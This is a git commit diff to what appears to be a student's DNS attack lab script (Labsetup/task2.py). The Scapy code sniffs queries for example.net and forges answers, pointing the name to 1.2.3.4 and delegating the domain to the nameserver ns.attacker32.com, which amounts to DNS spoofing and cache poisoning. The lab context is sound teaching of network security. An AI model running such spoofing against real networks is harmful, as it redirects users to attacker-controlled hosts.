737b15ca5009e3cff2d54440732c336cd6340311
hanhnguyengiahan <hanhhan2705@gmail.com>
2024-11-02 12:17:45 +1100

    fix fields inside dns packet

--- Labsetup/task2.py
+++ Labsetup/task2.py
@@ -1,19 +1,21 @@
 #!/usr/bin/env python3
 from scapy.all import *
 def spoof_dns_replies(pkt):
-    if (DNS in pkt and 'example.net' in pkt[DNS].qd.qname.decode('utf-8')):
+
+    if (DNS in pkt and "example.net" in pkt[DNS].qd.qname.decode('utf-8')):
         IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Response to the client
         UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)  # Standard DNS port
         Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=259200)  # Spoofed IP
         NSsec = DNSRR(rrname="example.net", type='NS', rdata='ns.attacker32.com', ttl=259200)
         DNSpkt = DNS(
             id=pkt[DNS].id,
-            qd=pkt[DNS].qd,
             aa=1,
             rd=0,
-            qdcount=1,
             qr=1,
+            qdcount=1,
             ancount=1,
+            nscount=1,
+            qd=pkt[DNS].qd,
             an=Anssec,
             ns=NSsec
         )
